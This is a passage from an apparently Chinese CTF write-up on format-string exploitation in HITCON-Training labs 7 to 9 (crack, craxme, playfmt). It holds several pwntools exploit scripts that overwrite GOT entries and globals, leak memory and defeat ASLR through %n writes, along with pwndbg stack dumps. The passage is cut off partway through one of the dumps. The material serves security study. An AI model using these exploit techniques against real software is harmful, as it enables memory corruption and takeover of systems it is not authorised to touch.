<span class="c1"># -*- coding: utf-8 -*-</span>
<span class="n">__Auther__</span> <span class="o">=</span> <span class="s1">&#39;M4x&#39;</span>

<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">putsGot</span> <span class="o">=</span> <span class="mh">0x804A01C</span>
<span class="n">bullet</span> <span class="o">=</span> <span class="mh">0x804872B</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./crack&#34;</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="p">{</span><span class="n">putsGot</span><span class="p">:</span> <span class="n">bullet</span><span class="p">})</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34; ? &#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">()</span>
<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
<span class="n">lab7</span> <span class="p">[</span><span class="n">master</span><span class="err">●●</span><span class="p">]</span> <span class="n">cat</span> <span class="n">overwrite</span><span class="o">.</span><span class="n">py</span> 
<span class="c1">#!/usr/bin/env python</span>
<span class="c1"># -*- coding: utf-8 -*-</span>
<span class="n">__Auther__</span> <span class="o">=</span> <span class="s1">&#39;M4x&#39;</span>

<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">pwdAddr</span> <span class="o">=</span> <span class="mh">0x804A048</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="p">{</span><span class="n">pwdAddr</span><span class="p">:</span> <span class="mi">6</span><span class="p">})</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./crack&#34;</span><span class="p">)</span>

<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34; ? &#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34; :&#34;</span><span class="p">,</span> <span class="s2">&#34;6&#34;</span><span class="p">)</span>

<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
<span class="n">lab7</span> <span class="p">[</span><span class="n">master</span><span class="err">●●</span><span class="p">]</span> <span class="n">cat</span> <span class="n">leak</span><span class="o">.</span><span class="n">py</span> 
<span class="c1">#!/usr/bin/env python</span>
<span class="c1"># -*- coding: utf-8 -*-</span>
<span class="n">__Auther__</span> <span class="o">=</span> <span class="s1">&#39;M4x&#39;</span>

<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">pwdAddr</span> <span class="o">=</span> <span class="mh">0x804A048</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pwdAddr</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;|%10$s||&#34;</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./crack&#34;</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34; ? &#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;|&#34;</span><span class="p">)</span>
<span class="n">leaked</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;||&#34;</span><span class="p">,</span> <span class="n">drop</span> <span class="o">=</span> <span class="bp">True</span><span class="p">))</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34; :&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">leaked</span><span class="p">))</span>

<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
</div><p>32位的 binary 可以直接使用 pwntools 封装好的<strong>fmtstr_payload</strong>函数：</p>
<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq2zoc31gjj30om0p3jv2.jpg" alt=""></p>
<h3 id="lab8-craxme">lab8-craxme</h3>
<p>同样是32位的 fsb，直接用 fmtstr_payload 就可以解决</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">lab8</span> <span class="p">[</span><span class="n">master</span><span class="err">●●</span><span class="p">]</span> <span class="n">cat</span> <span class="n">solve</span><span class="o">.</span><span class="n">py</span> 
<span class="c1">#!/usr/bin/env python</span>
<span class="c1"># -*- coding: utf-8 -*-</span>
<span class="n">__Auther__</span> <span class="o">=</span> <span class="s1">&#39;M4x&#39;</span>

<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">argv</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">&#34;debug&#34;</span>

<span class="n">magicAddr</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./craxme&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;magic&#34;</span><span class="p">]</span>

<span class="k">if</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;1&#34;</span><span class="p">:</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="p">{</span><span class="n">magicAddr</span><span class="p">:</span> <span class="mh">0xda</span><span class="p">})</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="p">{</span><span class="n">magicAddr</span><span class="p">:</span> <span class="mh">0xfaceb00c</span><span class="p">})</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./craxme&#34;</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34; :&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
</div><p>如果想要自己实现 fmtstr_payload 功能，可以参考这篇 <a href="https://paper.seebug.org/246/"><strong>文章</strong></a></p>
<h3 id="lab9-playfmt">lab9-playfmt</h3>
<p>和上一道题相比, lab9 的格式化字符串不在栈上,在全局变量 (.bss) 段, 因此我们就不能直接控制栈上的变量来进行修改 got 等行为,但可以通过控制</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">Breakpoint *do_fmt+64
pwndbg&gt; stack 25
00:0000│ esp  0xffffd0c0 —▸ 0x804a060 (buf) ◂— 0xa7025 /* &#39;%p\n&#39; */
01:0004│      0xffffd0c4 —▸ 0x8048640 ◂— jno    0x80486b7 /* &#39;quit&#39; */
02:0008│      0xffffd0c8 ◂— 0x4
03:000c│      0xffffd0cc —▸ 0x804857c (play+51) ◂— add    esp, 0x10
04:0010│      0xffffd0d0 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d
05:0014│      0xffffd0d4 —▸ 0xf7fa4000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
06:0018│ ebp  0xffffd0d8 —▸ 0xffffd0e8 —▸ 0xffffd0f8 ◂— 0x0
07:001c│      0xffffd0dc —▸ 0x8048584 (play+59) ◂— nop    
08:0020│      0xffffd0e0 —▸ 0xf7fa4d60 (_IO_2_1_stdout_) ◂— 0xfbad2887
09:0024│      0xffffd0e4 ◂— 0x0
0a:0028│      0xffffd0e8 —▸ 0xffffd0f8 ◂— 0x0
0b:002c│      0xffffd0ec —▸ 0x80485b1 (main+42) ◂— nop    
0c:0030│      0xffffd0f0 —▸ 0xf7fa43dc (__exit_funcs) —▸ 0xf7fa51e0 (initial) ◂— 0x0
0d:0034│      0xffffd0f4 —▸ 0xffffd110 ◂— 0x1
0e:0038│      0xffffd0f8 ◂— 0x0
0f:003c│      0xffffd0fc —▸ 0xf7e09276 (__libc_start_main+246) ◂— add    esp, 0x10
10:0040│      0xffffd100 ◂— 0x1
11:0044│      0xffffd104 —▸ 0xf7fa4000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
12:0048│      0xffffd108 ◂— 0x0
13:004c│      0xffffd10c —▸ 0xf7e09276 (__libc_start_main+246) ◂— add    esp, 0x10
14:0050│      0xffffd110 ◂— 0x1
15:0054│      0xffffd114 —▸ 0xffffd1a4 —▸ 0xffffd342 ◂— 0x6d6f682f (&#39;/hom&#39;)
16:0058│      0xffffd118 —▸ 0xffffd1ac —▸ 0xffffd375 ◂— 0x5f474458 (&#39;XDG_&#39;)
17:005c│      0xffffd11c ◂— 0x0
... ↓
pwndbg&gt; 
</code></pre></td></tr></table>
</div>
</div><p>如上 0x15, 0x16, 0x06 出的指针指向栈上的变量, 如修改 0x15 处为</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">15:0054│      0xffffd114 —▸ 0xffffd1a4 —▸ 0xffffd0dc —▸ 0x8048584 (play+59)
</code></pre></td></tr></table>
</div>
</div><p>然后再将 0x8048584 修改为某个 got 地址, 就可以实现间接地写 got 了, 这种方式也基本成了一种固定的套路, 如 hackme.inndy 的 <a href="https://github.com/0x01f/pwn_repo/tree/master/inndy_echo3">echo3</a> 一道题</p>
<h4 id="exp">exp</h4>
<p>为了解释清楚整个利用的过程, 我把我调试时的信息也放到脚本里了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span><span class="lnt">216
</span><span class="lnt">217
</span><span class="lnt">218
</span><span class="lnt">219
</span><span class="lnt">220
</span><span class="lnt">221
</span><span class="lnt">222
</span><span class="lnt">223
</span><span class="lnt">224
</span><span class="lnt">225
</span><span class="lnt">226
</span><span class="lnt">227
</span><span class="lnt">228
</span><span class="lnt">229
</span><span class="lnt">230
</span><span class="lnt">231
</span><span class="lnt">232
</span><span class="lnt">233
</span><span class="lnt">234
</span><span class="lnt">235
</span><span class="lnt">236
</span><span class="lnt">237
</span><span class="lnt">238
</span><span class="lnt">239
</span><span class="lnt">240
</span><span class="lnt">241
</span><span class="lnt">242
</span><span class="lnt">243
</span><span class="lnt">244
</span><span class="lnt">245
</span><span class="lnt">246
</span><span class="lnt">247
</span><span class="lnt">248
</span><span class="lnt">249
</span><span class="lnt">250
</span><span class="lnt">251
</span><span class="lnt">252
</span><span class="lnt">253
</span><span class="lnt">254
</span><span class="lnt">255
</span><span class="lnt">256
</span><span class="lnt">257
</span><span class="lnt">258
</span><span class="lnt">259
</span><span class="lnt">260
</span><span class="lnt">261
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python</span>
<span class="c1"># -*- coding: utf-8 -*-</span>
<span class="n">__Auther__</span> <span class="o">=</span> <span class="s1">&#39;M4x&#39;</span>

<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span>
<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;deepin-terminal&#39;</span><span class="p">,</span> <span class="s1">&#39;-x&#39;</span><span class="p">,</span> <span class="s1">&#39;sh&#39;</span><span class="p">,</span> <span class="s1">&#39;-c&#39;</span><span class="p">]</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./playfmt&#34;</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;/lib/i386-linux-gnu/libc.so.6&#34;</span><span class="p">)</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./playfmt&#34;</span><span class="p">)</span>

<span class="s1">&#39;&#39;&#39;
</span><span class="s1">Breakpoint *do_fmt+64
</span><span class="s1">pwndbg&gt; x/3s 0x804a060
</span><span class="s1">0x804a060 &lt;buf&gt;:	&#34;..%8$p....%6$p.&#34;...
</span><span class="s1">0x804a06f &lt;buf+15&gt;:	&#34;.11111111&#34;
</span><span class="s1">0x804a079 &lt;buf+25&gt;:	&#34;&#34;
</span><span class="s1">pwndbg&gt; stack 25
</span><span class="s1">00:0000│ esp  0xffa077c0 —▸ 0x804a060 (buf) ◂— 0x38252e2e (&#39;..%8&#39;)
</span><span class="s1">01:0004│      0xffa077c4 —▸ 0x8048640 ◂— jno    0x80486b7 /* &#39;quit&#39; */
</span><span class="s1">02:0008│      0xffa077c8 ◂— 0x4
</span><span class="s1">03:000c│      0xffa077cc —▸ 0x804857c (play+51) ◂— add    esp, 0x10
</span><span class="s1">04:0010│      0xffa077d0 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d
</span><span class="s1">05:0014│      0xffa077d4 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
</span><span class="s1">06:0018│ ebp  0xffa077d8 —▸ 0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
</span><span class="s1">07:001c│      0xffa077dc —▸ 0x8048584 (play+59) ◂— nop
</span><span class="s1">08:0020│      0xffa077e0 —▸ 0xf7eb0d60 (_IO_2_1_stdout_) ◂— 0xfbad2887
</span><span class="s1">09:0024│      0xffa077e4 ◂— 0x0
</span><span class="s1">0a:0028│      0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
</span><span class="s1">0b:002c│      0xffa077ec —▸ 0x80485b1 (main+42) ◂— nop
</span><span class="s1">0c:0030│      0xffa077f0 —▸ 0xf7eb03dc (__exit_funcs) —▸ 0xf7eb11e0 (initial) ◂— 0x0
</span><span class="s1">0d:0034│      0xffa077f4 —▸ 0xffa07810 ◂— 0x1
</span><span class="s1">0e:0038│      0xffa077f8 ◂— 0x0
</span><span class="s1">0f:003c│      0xffa077fc —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x10
</span><span class="s1">10:0040│      0xffa07800 ◂— 0x1
</span><span class="s1">11:0044│      0xffa07804 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
</span><span class="s1">12:0048│      0xffa07808 ◂— 0x0
</span><span class="s1">13:004c│      0xffa0780c —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x10
</span><span class="s1">14:0050│      0xffa07810 ◂— 0x1
</span><span class="s1">15:0054│      0xffa07814 —▸ 0xffa078a4 —▸ 0xffa083d6 ◂— &#39;./playfmt&#39;
</span><span class="s1">16:0058│      0xffa07818 —▸ 0xffa078ac —▸ 0xffa083e0 ◂— &#39;NO_AT_BRIDGE=1&#39;
</span><span class="s1">17:005c│      0xffa0781c ◂— 0x0
</span><span class="s1">... ↓
</span><span class="s1">&#39;&#39;&#39;</span>
<span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="s2">&#34;b *do_fmt+64</span><span class="se">\n</span><span class="s2">c&#34;</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&#34;..%8$p....%6$p..11111111</span><span class="se">\0</span><span class="s2">&#34;</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;..&#34;</span><span class="p">)</span>
<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;..&#34;</span><span class="p">,</span> <span class="n">drop</span> <span class="o">=</span> <span class="bp">True</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;_IO_2_1_stdout_&#39;</span><span class="p">]</span>
<span class="n">success</span><span class="p">(</span><span class="s2">&#34;libc.address -&gt; {:#x}&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;..&#34;</span><span class="p">)</span>
<span class="n">stack</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;..&#34;</span><span class="p">,</span> <span class="n">drop</span> <span class="o">=</span> <span class="bp">True</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x28</span>
<span class="n">success</span><span class="p">(</span><span class="s2">&#34;stack -&gt; {:#x}&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">stack</span><span class="p">))</span>
<span class="n">pause</span><span class="p">()</span>

<span class="s1">&#39;&#39;&#39;
</span><span class="s1">pwndbg&gt; x/3s 0x804a060
</span><span class="s1">0x804a060 &lt;buf&gt;:	&#34;</span><span class="si">%30684c</span><span class="s1">%21$hn%1&#34;...
</span><span class="s1">0x804a06f &lt;buf+15&gt;:	&#34;6c%22$hn2222222&#34;...
</span><span class="s1">0x804a07e &lt;buf+30&gt;:	&#34;2&#34;
</span><span class="s1">pwndbg&gt; stack 25
</span><span class="s1">00:0000│ esp  0xffa077c0 —▸ 0x804a060 (buf) ◂— 0x36303325 (&#39;%306&#39;)
</span><span class="s1">01:0004│      0xffa077c4 —▸ 0x8048640 ◂— jno    0x80486b7 /* &#39;quit&#39; */
</span><span class="s1">02:0008│      0xffa077c8 ◂— 0x4
</span><span class="s1">03:000c│      0xffa077cc —▸ 0x804857c (play+51) ◂— add    esp, 0x10
</span><span class="s1">04:0010│      0xffa077d0 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d
</span><span class="s1">05:0014│      0xffa077d4 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
</span><span class="s1">06:0018│ ebp  0xffa077d8 —▸ 0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
</span><span class="s1">07:001c│      0xffa077dc —▸ 0x8048584 (play+59) ◂— nop
</span><span class="s1">08:0020│      0xffa077e0 —▸ 0xf7eb0d60 (_IO_2_1_stdout_) ◂— 0xfbad2887
</span><span class="s1">09:0024│      0xffa077e4 ◂— 0x0
</span><span class="s1">0a:0028│      0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
</span><span class="s1">0b:002c│      0xffa077ec —▸ 0x80485b1 (main+42) ◂— nop
</span><span class="s1">0c:0030│      0xffa077f0 —▸ 0xf7eb03dc (__exit_funcs) —▸ 0xf7eb11e0 (initial) ◂— 0x0
</span><span class="s1">0d:0034│      0xffa077f4 —▸ 0xffa07810 ◂— 0x1
</span><span class="s1">0e:0038│      0xffa077f8 ◂— 0x0
</span><span class="s1">0f:003c│      0xffa077fc —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x10
</span><span class="s1">10:0040│      0xffa07800 ◂— 0x1
</span><span class="s1">11:0044│      0xffa07804 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
</span><span class="s1">12:0048│      0xffa07808 ◂— 0x0
</span><span class="s1">13:004c│      0xffa0780c —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x10
</span><span class="s1">14:0050│      0xffa07810 ◂— 0x1
</span><span class="s1">15:0054│      0xffa07814 —▸ 0xffa078a4 —▸ 0xffa083d6 ◂— &#39;./playfmt&#39;
</span><span class="s1">16:0058│      0xffa07818 —▸ 0xffa078ac —▸ 0xffa083e0 ◂— &#39;NO_AT_BRIDGE=1&#39;
</span><span class="s1">17:005c│      0xffa0781c ◂— 0x0
</span><span class="s1">... ↓
</span><span class="s1">&#39;&#39;&#39;</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;%{}c%{}$hn&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">((</span><span class="n">stack</span> <span class="o">+</span> <span class="mh">0x1c</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">,</span> <span class="mh">0x15</span><span class="p">)</span>
<span class="c1">#  payload += &#34;%{}c%{}$hn&#34;.format((stack + 0x2c) &amp; 0xffff - (stack + 0x1c) &amp; 0xffff, 0x16)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s2">&#34;%{}c%{}$hn&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;22222222</span><span class="se">\0</span><span class="s1">&#39;</span>
<span class="n">info</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;11111111&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
<span class="n">pause</span><span class="p">()</span>

<span class="s1">&#39;&#39;&#39;
</span><span class="s1">pwndbg&gt; x/3s 0x804a060
</span><span class="s1">0x804a060 &lt;buf&gt;:	&#34;</span><span class="si">%40976c</span><span class="s1">%57$hn%2&#34;...
</span><span class="s1">0x804a06f &lt;buf+15&gt;:	&#34;c%59$hn33333333&#34;
</span><span class="s1">0x804a07e &lt;buf+30&gt;:	&#34;&#34;
</span><span class="s1">pwndbg&gt; stack 25
